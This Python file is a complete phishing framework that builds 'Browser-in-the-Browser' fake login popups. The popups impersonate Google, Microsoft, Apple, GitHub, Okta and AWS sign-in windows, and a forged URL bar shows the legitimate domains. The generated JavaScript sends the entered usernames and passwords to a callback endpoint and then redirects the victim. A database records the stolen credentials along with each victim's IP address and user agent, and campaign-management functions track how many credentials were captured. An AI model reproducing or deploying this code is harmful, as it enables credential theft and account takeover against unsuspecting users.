#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════════════════╗
║                    BROWSER-IN-THE-BROWSER (BitB) PHISHING                              ║
║                    Advanced Credential Harvesting 🪟                                   ║
╠═══════════════════════════════════════════════════════════════════════════════════════╣
║  Generate realistic fake browser popup windows for credential theft                    ║
║  - Pixel-perfect OAuth/SSO login windows                                               ║
║  - Fake URL bar showing legitimate domains                                             ║
║  - Support for Google, Microsoft, Apple, GitHub, etc.                                  ║
║  - Mobile and desktop templates                                                         ║
╚═══════════════════════════════════════════════════════════════════════════════════════╝
"""

import json
import sqlite3
import os
import hashlib
import base64
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Any
import logging
import re

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class BitBProvider(Enum):
    """Supported OAuth/SSO providers"""
    GOOGLE = "google"
    MICROSOFT = "microsoft"
    APPLE = "apple"
    GITHUB = "github"
    FACEBOOK = "facebook"
    TWITTER = "twitter"
    LINKEDIN = "linkedin"
    OKTA = "okta"
    AZURE_AD = "azure_ad"
    AWS = "aws"


class BrowserType(Enum):
    """Browser window styles"""
    CHROME_WINDOWS = "chrome_windows"
    CHROME_MAC = "chrome_mac"
    FIREFOX_WINDOWS = "firefox_windows"
    FIREFOX_MAC = "firefox_mac"
    EDGE = "edge"
    SAFARI = "safari"


class DeviceType(Enum):
    """Device types"""
    DESKTOP = "desktop"
    MOBILE = "mobile"
    TABLET = "tablet"


@dataclass
class BitBTemplate:
    """Browser-in-the-Browser template"""
    provider: BitBProvider
    browser: BrowserType
    device: DeviceType
    title: str
    fake_url: str
    html_content: str
    css_content: str
    js_content: str
    favicon: str = ""


@dataclass
class PhishingCampaign:
    """BitB phishing campaign"""
    campaign_id: str
    name: str
    provider: BitBProvider
    browser: BrowserType
    target_url: str
    callback_url: str
    collected_creds: int = 0
    created_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())


class BitBPhishing:
    """Browser-in-the-Browser Phishing Framework"""
    
    _instance = None
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        
        self.db_path = Path("/tmp/bitb_phishing.db")
        self.output_dir = Path("/tmp/bitb_templates")
        self.output_dir.mkdir(exist_ok=True)
        
        self._init_database()
        
        # Load window chrome assets
        self.window_chrome = self._load_window_chrome()
        
        # Load provider templates
        self.providers = self._load_provider_templates()
        
        logger.info("BitB Phishing Framework initialized")
    
    def _init_database(self):
        """Initialize database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS campaigns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT UNIQUE,
                    name TEXT,
                    provider TEXT,
                    browser TEXT,
                    target_url TEXT,
                    callback_url TEXT,
                    collected_creds INTEGER DEFAULT 0,
                    created_at TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS captured_creds (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id TEXT,
                    username TEXT,
                    password TEXT,
                    user_agent TEXT,
                    ip_address TEXT,
                    captured_at TEXT
                )
            """)
            
            conn.commit()
    
    def _load_window_chrome(self) -> Dict[str, Dict]:
        """Load browser window chrome (frame) templates"""
        return {
            "chrome_windows": {
                "title_bar_height": "32px",
                "title_bar_bg": "#dee1e6",
                "title_bar_bg_inactive": "#e8eaed",
                "close_btn_hover": "#e81123",
                "min_max_hover": "#e5e5e5",
                "border_radius": "8px",
                "shadow": "0 8px 32px rgba(0,0,0,0.35)",
                "url_bar_bg": "#f1f3f4",
                "url_bar_text": "#202124",
                "ssl_icon": "🔒",
                "controls_html": '''
                    <div class="bitb-controls">
                        <div class="control minimize">─</div>
                        <div class="control maximize">☐</div>
                        <div class="control close">✕</div>
                    </div>
                '''
            },
            "chrome_mac": {
                "title_bar_height": "28px",
                "title_bar_bg": "#e8e8e8",
                "title_bar_bg_inactive": "#f6f6f6",
                "border_radius": "10px",
                "shadow": "0 8px 32px rgba(0,0,0,0.3)",
                "url_bar_bg": "#ffffff",
                "url_bar_text": "#202124",
                "ssl_icon": "🔒",
                "controls_html": '''
                    <div class="bitb-controls mac">
                        <div class="control close" style="background:#ff5f57"></div>
                        <div class="control minimize" style="background:#febc2e"></div>
                        <div class="control maximize" style="background:#28c840"></div>
                    </div>
                '''
            },
            "edge": {
                "title_bar_height": "32px",
                "title_bar_bg": "#f3f3f3",
                "border_radius": "8px",
                "shadow": "0 8px 32px rgba(0,0,0,0.35)",
                "url_bar_bg": "#f4f4f4",
                "url_bar_text": "#1a1a1a",
                "ssl_icon": "🔒"
            },
            "safari": {
                "title_bar_height": "36px",
                "title_bar_bg": "#f5f5f5",
                "border_radius": "12px",
                "shadow": "0 12px 40px rgba(0,0,0,0.3)",
                "url_bar_bg": "#ffffff",
                "url_bar_text": "#000000",
                "ssl_icon": "🔒"
            }
        }
    
    def _load_provider_templates(self) -> Dict[str, Dict]:
        """Load OAuth provider templates"""
        return {
            "google": {
                "name": "Google",
                "domain": "accounts.google.com",
                "favicon": "https://www.google.com/favicon.ico",
                "logo_url": "https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png",
                "primary_color": "#4285f4",
                "title": "Sign in - Google Accounts",
                "form_fields": ["email", "password"],
                "button_text": "Next",
            },
            "microsoft": {
                "name": "Microsoft",
                "domain": "login.microsoftonline.com",
                "favicon": "https://logincdn.msftauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico",
                "logo_url": "https://logincdn.msftauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg",
                "primary_color": "#0078d4",
                "title": "Sign in to your account",
                "form_fields": ["email", "password"],
                "button_text": "Sign in",
            },
            "apple": {
                "name": "Apple",
                "domain": "appleid.apple.com",
                "favicon": "https://www.apple.com/favicon.ico",
                "logo_url": "",
                "primary_color": "#000000",
                "title": "Sign in with Apple ID",
                "form_fields": ["apple_id", "password"],
                "button_text": "Sign In",
            },
            "github": {
                "name": "GitHub",
                "domain": "github.com",
                "favicon": "https://github.githubassets.com/favicons/favicon.svg",
                "logo_url": "https://github.githubassets.com/images/modules/logos_page/GitHub-Logo.png",
                "primary_color": "#2da44e",
                "title": "Sign in to GitHub",
                "form_fields": ["username_or_email", "password"],
                "button_text": "Sign in",
            },
            "okta": {
                "name": "Okta",
                "domain": "login.okta.com",
                "favicon": "",
                "logo_url": "",
                "primary_color": "#007dc1",
                "title": "Sign In",
                "form_fields": ["username", "password"],
                "button_text": "Sign In",
            },
            "aws": {
                "name": "Amazon Web Services",
                "domain": "signin.aws.amazon.com",
                "favicon": "https://a0.awsstatic.com/libra-css/images/site/fav/favicon.ico",
                "logo_url": "",
                "primary_color": "#ff9900",
                "title": "Sign in as IAM user",
                "form_fields": ["account_id", "username", "password"],
                "button_text": "Sign in",
            }
        }
    
    def generate_template(self, provider: str, browser: str = "chrome_windows",
                         callback_url: str = "/capture", custom_domain: str = None) -> Dict[str, str]:
        """Generate complete BitB phishing template"""
        
        provider_config = self.providers.get(provider)
        chrome_config = self.window_chrome.get(browser)
        
        if not provider_config or not chrome_config:
            return None
        
        domain = custom_domain or provider_config['domain']
        
        # Generate HTML
        html = self._generate_html(provider_config, chrome_config, domain, callback_url)
        
        # Generate CSS
        css = self._generate_css(chrome_config, provider_config)
        
        # Generate JS
        js = self._generate_js(callback_url)
        
        return {
            "html": html,
            "css": css,
            "js": js,
            "provider": provider,
            "browser": browser,
            "fake_url": f"https://{domain}/oauth/authorize"
        }
    
    def _generate_html(self, provider: Dict, chrome: Dict, domain: str, callback_url: str) -> str:
        """Generate BitB HTML template"""
        return f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{provider['title']}</title>
    <link rel="stylesheet" href="bitb.css">
</head>
<body>
    <!-- Background overlay -->
    <div class="bitb-overlay" id="bitb-overlay">
        <!-- Fake Browser Window -->
        <div class="bitb-window" id="bitb-window">
            <!-- Title Bar -->
            <div class="bitb-title-bar">
                {chrome.get('controls_html', '')}
                <div class="bitb-title">{provider['title']}</div>
            </div>
            
            <!-- URL Bar -->
            <div class="bitb-url-bar">
                <div class="bitb-nav-buttons">
                    <span class="nav-btn">←</span>
                    <span class="nav-btn">→</span>
                    <span class="nav-btn">↻</span>
                </div>
                <div class="bitb-url-input">
                    <span class="ssl-icon">{chrome['ssl_icon']}</span>
                    <span class="url-text">https://{domain}</span>
                </div>
                <div class="bitb-menu">⋮</div>
            </div>
            
            <!-- Content Area -->
            <div class="bitb-content">
                <div class="login-container">
                    <!-- Provider Logo -->
                    <div class="provider-logo">
                        {"<img src='" + provider['logo_url'] + "' alt='" + provider['name'] + "'>" if provider.get('logo_url') else f"<h1>{provider['name']}</h1>"}
                    </div>
                    
                    <h2 class="login-title">Sign in</h2>
                    <p class="login-subtitle">to continue to {provider['name']}</p>
                    
                    <!-- Login Form -->
                    <form class="login-form" id="bitb-form" action="{callback_url}" method="POST">
                        <input type="hidden" name="provider" value="{provider['name']}">
                        <input type="hidden" name="timestamp" value="">
                        
                        <div class="form-group">
                            <input type="text" name="username" id="username" placeholder="Email or username" required>
                            <label for="username">Email or username</label>
                        </div>
                        
                        <div class="form-group password-group" style="display:none;">
                            <input type="password" name="password" id="password" placeholder="Password">
                            <label for="password">Password</label>
                            <span class="toggle-password">👁</span>
                        </div>
                        
                        <div class="forgot-password">
                            <a href="#">Forgot password?</a>
                        </div>
                        
                        <div class="form-actions">
                            <a href="#" class="create-account">Create account</a>
                            <button type="submit" class="submit-btn" style="background:{provider['primary_color']}">{provider['button_text']}</button>
                        </div>
                    </form>
                    
                    <div class="footer-links">
                        <a href="#">Privacy</a>
                        <a href="#">Terms</a>
                        <a href="#">Help</a>
                    </div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="bitb.js"></script>
</body>
</html>'''
    
    def _generate_css(self, chrome: Dict, provider: Dict) -> str:
        """Generate BitB CSS"""
        return f'''/* BitB - Browser-in-the-Browser Phishing CSS */
* {{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
}}

body {{
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    background: rgba(0, 0, 0, 0.5);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
}}

.bitb-overlay {{
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.6);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
}}

.bitb-window {{
    width: 450px;
    background: white;
    border-radius: {chrome['border_radius']};
    box-shadow: {chrome['shadow']};
    overflow: hidden;
    animation: windowAppear 0.2s ease-out;
}}

@keyframes windowAppear {{
    from {{
        opacity: 0;
        transform: scale(0.95);
    }}
    to {{
        opacity: 1;
        transform: scale(1);
    }}
}}

/* Title Bar */
.bitb-title-bar {{
    height: {chrome['title_bar_height']};
    background: {chrome['title_bar_bg']};
    display: flex;
    align-items: center;
    padding: 0 12px;
    user-select: none;
    cursor: default;
}}

.bitb-controls {{
    display: flex;
    gap: 8px;
}}

.bitb-controls .control {{
    width: 12px;
    height: 12px;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 9px;
    cursor: pointer;
}}

.bitb-controls:not(.mac) .control {{
    width: 46px;
    height: 100%;
    border-radius: 0;
    font-size: 12px;
}}

.bitb-controls:not(.mac) .control.close:hover {{
    background: #e81123;
    color: white;
}}

.bitb-title {{
    flex: 1;
    text-align: center;
    font-size: 13px;
    color: #333;
}}

/* URL Bar */
.bitb-url-bar {{
    height: 40px;
    background: {chrome['url_bar_bg']};
    display: flex;
    align-items: center;
    padding: 0 12px;
    gap: 8px;
    border-bottom: 1px solid #e0e0e0;
}}

.bitb-nav-buttons {{
    display: flex;
    gap: 4px;
}}

.nav-btn {{
    width: 28px;
    height: 28px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 50%;
    cursor: pointer;
    color: #5f6368;
    font-size: 16px;
}}

.nav-btn:hover {{
    background: rgba(0,0,0,0.05);
}}

.bitb-url-input {{
    flex: 1;
    height: 28px;
    background: white;
    border-radius: 14px;
    display: flex;
    align-items: center;
    padding: 0 12px;
    font-size: 14px;
    border: 1px solid #dfe1e5;
}}

.ssl-icon {{
    margin-right: 6px;
    color: #188038;
}}

.url-text {{
    color: {chrome['url_bar_text']};
}}

.bitb-menu {{
    font-size: 18px;
    cursor: pointer;
    padding: 4px;
    color: #5f6368;
}}

/* Content */
.bitb-content {{
    padding: 40px;
    background: white;
    min-height: 400px;
}}

.login-container {{
    max-width: 320px;
    margin: 0 auto;
}}

.provider-logo {{
    text-align: center;
    margin-bottom: 20px;
}}

.provider-logo img {{
    height: 40px;
    object-fit: contain;
}}

.provider-logo h1 {{
    font-size: 28px;
    color: {provider['primary_color']};
}}

.login-title {{
    font-size: 24px;
    font-weight: 400;
    text-align: center;
    margin-bottom: 8px;
    color: #202124;
}}

.login-subtitle {{
    text-align: center;
    color: #5f6368;
    margin-bottom: 32px;
}}

/* Form */
.form-group {{
    position: relative;
    margin-bottom: 24px;
}}

.form-group input {{
    width: 100%;
    height: 56px;
    padding: 16px;
    font-size: 16px;
    border: 1px solid #dadce0;
    border-radius: 4px;
    outline: none;
    transition: border-color 0.2s;
}}

.form-group input:focus {{
    border-color: {provider['primary_color']};
    border-width: 2px;
}}

.form-group label {{
    position: absolute;
    top: 50%;
    left: 16px;
    transform: translateY(-50%);
    font-size: 16px;
    color: #5f6368;
    pointer-events: none;
    transition: 0.2s;
    background: white;
    padding: 0 4px;
}}

.form-group input:focus + label,
.form-group input:not(:placeholder-shown) + label {{
    top: 0;
    font-size: 12px;
    color: {provider['primary_color']};
}}

.toggle-password {{
    position: absolute;
    right: 16px;
    top: 50%;
    transform: translateY(-50%);
    cursor: pointer;
}}

.forgot-password {{
    margin-bottom: 32px;
}}

.forgot-password a {{
    color: {provider['primary_color']};
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
}}

.form-actions {{
    display: flex;
    justify-content: space-between;
    align-items: center;
}}

.create-account {{
    color: {provider['primary_color']};
    text-decoration: none;
    font-size: 14px;
    font-weight: 500;
}}

.submit-btn {{
    padding: 10px 24px;
    font-size: 14px;
    font-weight: 500;
    color: white;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    transition: box-shadow 0.2s;
}}

.submit-btn:hover {{
    box-shadow: 0 1px 3px rgba(0,0,0,0.3);
}}

.footer-links {{
    margin-top: 48px;
    text-align: center;
}}

.footer-links a {{
    color: #5f6368;
    text-decoration: none;
    font-size: 12px;
    margin: 0 12px;
}}

/* Responsive */
@media (max-width: 500px) {{
    .bitb-window {{
        width: 100%;
        height: 100%;
        border-radius: 0;
    }}
}}'''
    
    def _generate_js(self, callback_url: str) -> str:
        """Generate BitB JavaScript"""
        return f'''// BitB - Browser-in-the-Browser JavaScript
document.addEventListener('DOMContentLoaded', function() {{
    const form = document.getElementById('bitb-form');
    const usernameInput = document.getElementById('username');
    const passwordGroup = document.querySelector('.password-group');
    const passwordInput = document.getElementById('password');
    const submitBtn = document.querySelector('.submit-btn');
    const togglePassword = document.querySelector('.toggle-password');
    
    let stage = 'username';
    
    // Handle form submission
    form.addEventListener('submit', function(e) {{
        e.preventDefault();
        
        if (stage === 'username') {{
            // Show password field
            passwordGroup.style.display = 'block';
            usernameInput.parentElement.style.display = 'none';
            passwordInput.focus();
            submitBtn.textContent = 'Sign in';
            stage = 'password';
        }} else {{
            // Submit credentials
            const timestamp = new Date().toISOString();
            document.querySelector('input[name="timestamp"]').value = timestamp;
            
            // Collect form data
            const formData = new FormData(form);
            
            // Send to callback
            fetch('{callback_url}', {{
                method: 'POST',
                body: formData
            }}).then(() => {{
                // Redirect to legitimate site
                window.location.href = 'https://www.google.com';
            }}).catch(() => {{
                // Still redirect on error
                window.location.href = 'https://www.google.com';
            }});
        }}
    }});
    
    // Toggle password visibility
    if (togglePassword) {{
        togglePassword.addEventListener('click', function() {{
            if (passwordInput.type === 'password') {{
                passwordInput.type = 'text';
                togglePassword.textContent = '🙈';
            }} else {{
                passwordInput.type = 'password';
                togglePassword.textContent = '👁';
            }}
        }});
    }}
    
    // Close button
    const closeBtn = document.querySelector('.control.close');
    if (closeBtn) {{
        closeBtn.addEventListener('click', function() {{
            document.getElementById('bitb-overlay').style.display = 'none';
        }});
    }}
    
    // Draggable window
    const window = document.getElementById('bitb-window');
    const titleBar = document.querySelector('.bitb-title-bar');
    let isDragging = false;
    let currentX, currentY, initialX, initialY;
    
    titleBar.addEventListener('mousedown', function(e) {{
        if (e.target.classList.contains('control')) return;
        isDragging = true;
        initialX = e.clientX - window.offsetLeft;
        initialY = e.clientY - window.offsetTop;
    }});
    
    document.addEventListener('mousemove', function(e) {{
        if (!isDragging) return;
        e.preventDefault();
        currentX = e.clientX - initialX;
        currentY = e.clientY - initialY;
        window.style.position = 'absolute';
        window.style.left = currentX + 'px';
        window.style.top = currentY + 'px';
    }});
    
    document.addEventListener('mouseup', function() {{
        isDragging = false;
    }});
}});'''
    
    def create_campaign(self, name: str, provider: str, browser: str = "chrome_windows",
                       callback_url: str = "/capture") -> str:
        """Create a new BitB phishing campaign"""
        campaign_id = hashlib.md5(f"{name}{datetime.utcnow().isoformat()}".encode()).hexdigest()[:16]
        
        # Generate template
        template = self.generate_template(provider, browser, callback_url)
        
        if not template:
            return None
        
        # Save files
        campaign_dir = self.output_dir / campaign_id
        campaign_dir.mkdir(exist_ok=True)
        
        (campaign_dir / "index.html").write_text(template['html'])
        (campaign_dir / "bitb.css").write_text(template['css'])
        (campaign_dir / "bitb.js").write_text(template['js'])
        
        # Save to database
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                INSERT INTO campaigns (campaign_id, name, provider, browser, target_url, callback_url, created_at)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            """, (campaign_id, name, provider, browser, template['fake_url'], callback_url,
                  datetime.utcnow().isoformat()))
            conn.commit()
        
        logger.info(f"Created BitB campaign: {campaign_id}")
        return campaign_id
    
    def capture_credentials(self, campaign_id: str, username: str, password: str,
                           user_agent: str = "", ip_address: str = "") -> bool:
        """Capture credentials from phishing page"""
        try:
            with sqlite3.connect(self.db_path) as conn:
                conn.execute("""
                    INSERT INTO captured_creds (campaign_id, username, password, user_agent, ip_address, captured_at)
                    VALUES (?, ?, ?, ?, ?, ?)
                """, (campaign_id, username, password, user_agent, ip_address,
                      datetime.utcnow().isoformat()))
                
                conn.execute("""
                    UPDATE campaigns SET collected_creds = collected_creds + 1 WHERE campaign_id = ?
                """, (campaign_id,))
                
                conn.commit()
            
            logger.info(f"Captured credentials for campaign {campaign_id}: {username}")
            return True
            
        except Exception as e:
            logger.error(f"Error capturing credentials: {e}")
            return False
    
    def get_campaigns(self) -> List[Dict]:
        """Get all campaigns"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("""
                SELECT campaign_id, name, provider, browser, target_url, collected_creds, created_at
                FROM campaigns ORDER BY created_at DESC
            """).fetchall()
            
            return [dict(row) for row in rows]
    
    def get_campaign_creds(self, campaign_id: str) -> List[Dict]:
        """Get captured credentials for a campaign"""
        with sqlite3.connect(self.db_path) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute("""
                SELECT username, password, user_agent, ip_address, captured_at
                FROM captured_creds WHERE campaign_id = ? ORDER BY captured_at DESC
            """, (campaign_id,)).fetchall()
            
            return [dict(row) for row in rows]
    
    def get_available_providers(self) -> List[Dict]:
        """Get available OAuth providers"""
        return [
            {"id": name, "name": config['name'], "domain": config['domain']}
            for name, config in self.providers.items()
        ]
    
    def get_available_browsers(self) -> List[Dict]:
        """Get available browser styles"""
        return [
            {"id": name, "name": name.replace("_", " ").title()}
            for name in self.window_chrome.keys()
        ]


def get_bitb_phishing() -> BitBPhishing:
    """Get BitB Phishing singleton"""
    return BitBPhishing()


if __name__ == "__main__":
    bitb = get_bitb_phishing()
    
    print("Browser-in-the-Browser (BitB) Phishing Framework")
    print("=" * 50)
    
    print("\nAvailable Providers:")
    for p in bitb.get_available_providers():
        print(f"  - {p['name']} ({p['domain']})")
    
    print("\nAvailable Browser Styles:")
    for b in bitb.get_available_browsers():
        print(f"  - {b['name']}")
    
    # Demo: Create a Google phishing campaign
    print("\nCreating demo Google phishing campaign...")
    campaign_id = bitb.create_campaign("Test Campaign", "google", "chrome_windows")
    
    if campaign_id:
        print(f"Campaign created: {campaign_id}")
        print(f"Files saved to: /tmp/bitb_templates/{campaign_id}/")
